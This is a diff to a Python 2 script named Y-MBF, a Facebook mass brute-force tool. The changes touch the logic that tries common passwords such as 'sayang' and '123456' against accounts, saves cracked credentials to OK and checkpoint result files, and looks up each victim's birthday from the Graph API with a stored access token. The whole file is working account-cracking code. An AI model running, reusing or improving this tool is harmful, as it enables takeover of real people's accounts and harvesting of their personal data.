@@ -1,10 +1,10 @@
-#!usr/bin/python2.7
+#!/usr/bin/python2
 # coding=utf-8
 
 #######################################################
 # Name           : Y-MBF (MBF) <token method>         #
 # File           : ymbf.py                            #
-# Author         : Moch Yayan Juan Alvredo XD.        #
+# Author         : Moch Yayan Juan Alvredo XD         #
 # Github         : https://github.com/Yayan-XD        #
 # Facebook       : https://www.facebook.com/KM39453   #
 # Instagram      : https://www.instagram.com/yayanxd_ #
@@ -73,7 +73,7 @@ my_color = [
 warna = random.choice(my_color)
 #  Moch Yayan Juan Alvredo XD.  #
 #------------------------------->
-s = requests.Session()
+ua = requests.get('https://raw.githubusercontent.com/Yayan-XD/ymbf/main/data/cy.txt').text.strip()
 ok = []
 cp = []
 id = []
@@ -207,9 +207,9 @@ def awokawokawokawokawokawokawokawokawokawokawokawok():
                 try:
                     totalok = open("results/OK-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
                     print("\n \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
-                    print(" \033[0;97m[\033[0;92m+\033[0;97m] Hasil \033[0;92mOK\033[0;97m pada tanggal : \033[0;92m%s-%s-%s \033[0;92mTotal %s: %s%s\033[0;92m"%(ha, op, ta,M,H,len(totalok)))
+                    print(" \033[0;97m[\033[0;92m+\033[0;97m] Hasil \033[0;92mOK\033[0;97m pada tanggal : \033[0;92m%s-%s-%s \x1b[0mTotal %s: %s%s\033[0;92m\n"%(ha, op, ta,M,H,len(totalok)))
                     os.system("cat results/OK-%s-%s-%s.txt"%(ha, op, ta))
-                    print(" \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
+                    print("\n \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
                     moch_yayan()
                 except (IOError):
                     print("\n \033[0;97m[\033[0;91m!\033[0;97m] Kamu tidak mendapatkan hasil ok :(")
@@ -219,9 +219,9 @@ def awokawokawokawokawokawokawokawokawokawokawokawok():
                 try:
                     totalcp = open("results/CP-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
                     print("\n \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
-                    print(" \033[0;97m[\033[0;92m+\033[0;97m] Hasil \033[0;93mCP\033[0;97m pada tanggal : \033[0;92m%s-%s-%s \033[0;92mTotal %s: %s%s\033[0;93m"%(ha, op, ta,M,K,len(totalcp)))
+                    print(" \033[0;97m[\033[0;92m+\033[0;97m] Hasil \033[0;93mCP\033[0;97m pada tanggal : \033[0;92m%s-%s-%s \x1b[0mTotal %s: %s%s\033[0;93m\n"%(ha, op, ta,M,K,len(totalcp)))
                     os.system("cat results/CP-%s-%s-%s.txt"%(ha, op, ta))
-                    print(" \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
+                    print("\n \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
                     raw_input('\n  [ %sKEMBALI%s ] '%(O,N))
                     moch_yayan()
                 except (IOError):
@@ -592,7 +592,7 @@ def ganti_user_agent():
 			exit()
 	elif wibu == 't' or wibu == 'T':
 		try:
-			ua = s.get('https://raw.githubusercontent.com/Yayan-XD/ymbf/main/data/cy.txt').text.strip()
+			ua = requests.get('https://raw.githubusercontent.com/Yayan-XD/ymbf/main/data/cy.txt').text.strip()
 			uas = open('.ua','w')
 			uas.write(ua) 
 			uas.close()
@@ -726,19 +726,14 @@ class __crack__:
             elif 'www.facebook.com' in response.json()['error_msg']:
                 try:
                     __cindy__ = open('__yayan__.txt','r').read()
-                    url = ('https://graph.facebook.com/%s?access_token=%s'%(user,__cindy__))
-                    data = s.get(url).json()
-                    ttl = data['birthday'].replace("/","-")
-                    print '\r  %s* --> %s | %s %s      %s' % (K,user,pw,ttl,N)
-                    wrt = ' [×] %s|%s %s' % (user,pw,ttl)
-                    cp.append(wrt)
-                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
-                    break
+                    ak = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,__cindy__))
+                    az = json.loads(ak.text)
+                    ttl= az['birthday']
                 except (KeyError, IOError):
                     ttl = ' '
                 except: pass
-                print '\r  %s* --> %s|%s            %s' % (K,user,pw,N)
-                wrt = ' [×] %s|%s' % (user,pw)
+                print '\r  %s* --> %s | %s %s            %s' % (K,user,pw,ttl,N)
+                wrt = ' [×] %s|%s %s' % (user,pw,ttl)
                 cp.append(wrt)
                 open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                 break
@@ -766,19 +761,14 @@ class __crack__:
             if 'checkpoint' in xo:
                 try:
                     __cindy__ = open('__yayan__.txt','r').read()
-                    url = ('https://graph.facebook.com/%s?access_token=%s'%(user,__cindy__))
-                    data = s.get(url).json()
-                    ttl = data['birthday'].replace("/","-")
-                    print '\r  %s* --> %s | %s %s      %s' % (K,user,pw,ttl,N)
-                    wrt = ' [×] %s|%s %s' % (user,pw,ttl)
-                    cp.append(wrt)
-                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
-                    break
+                    ak = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,__cindy__))
+                    az = json.loads(ak.text)
+                    ttl= az['birthday']
                 except (KeyError, IOError):
                     ttl = ' '
                 except: pass
-                print '\r  %s* --> %s|%s            %s' % (K,user,pw,N)
-                wrt = ' [×] %s|%s' % (user,pw)
+                print '\r  %s* --> %s | %s %s            %s' % (K,user,pw,ttl,N)
+                wrt = ' [×] %s|%s %s' % (user,pw,ttl)
                 cp.append(wrt)
                 open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                 break
@@ -809,19 +799,14 @@ class __crack__:
             elif 'checkpoint' in ses.cookies.get_dict().keys():
             	try:
                     __cindy__ = open('__yayan__.txt','r').read()
-                    url = ('https://graph.facebook.com/%s?access_token=%s'%(user,__cindy__))
-                    data = s.get(url).json()
-                    ttl = data['birthday'].replace("/","-")
-                    print '\r  %s* --> %s | %s %s      %s' % (K,user,pw,ttl,N)
-                    wrt = ' [×] %s|%s %s' % (user,pw,ttl)
-                    cp.append(wrt)
-                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
-                    break
+                    ak = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,__cindy__))
+                    az = json.loads(ak.text)
+                    ttl= az['birthday']
                 except (KeyError, IOError):
                     ttl = ' '
                 except: pass
-                print '\r  %s* --> %s|%s            %s' % (K,user,pw,N)
-                wrt = ' [×] %s|%s' % (user,pw)
+                print '\r  %s* --> %s | %s %s            %s' % (K,user,pw,ttl,N)
+                wrt = ' [×] %s|%s %s' % (user,pw,ttl)
                 cp.append(wrt)
                 open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                 break
@@ -870,7 +855,7 @@ class __crack__:
                         		'sayang', 'anjing',
                         		'bismillah', '123456'
                         	]
-                        __yayanXD__.submit(self.__api__,bb[0],raimuuu)
+                        __yayanXD__.submit(self.__api__, bb[0], raimuuu)
                     except:
                         pass
 
